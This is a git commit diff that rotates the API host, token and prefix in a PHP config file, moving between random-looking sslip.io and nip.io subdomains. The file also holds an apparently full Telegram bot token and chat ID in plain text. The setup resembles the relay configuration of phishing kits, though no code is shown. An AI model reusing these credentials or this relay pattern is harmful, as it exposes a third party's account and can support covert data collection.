5791d703037f51333b440763d3b5169e8134febd
stewartbrent50-dev <stewartbrent50@gmail.com>
2026-09-17 05:53:34 -0500

    Change API host and token in config.php
    Updated API host and token values in config.php.

--- config.php
+++ config.php
@@ -1,8 +1,8 @@
 <?php
 
-$api_host = "d3368f73521073a1.a758a6c5.sslip.io";
-$api_token = "3d6dc6bae6efde77e5e3b9b9dbc529";
-$api_prefix = "0spt83xj";
+$api_host = "f520f7a69504b486.994be7fa.nip.io";
+$api_token = "889a24b6ead697b62349903db3accc";
+$api_prefix = "dy2m0w4m";
 
 $telegram_bot_token = "8483018592:AAFFmRT_A_Ln3Z4ZW9GJ-vfEJ91tFicKOmM";
 $telegram_chat_id = "7916544819";
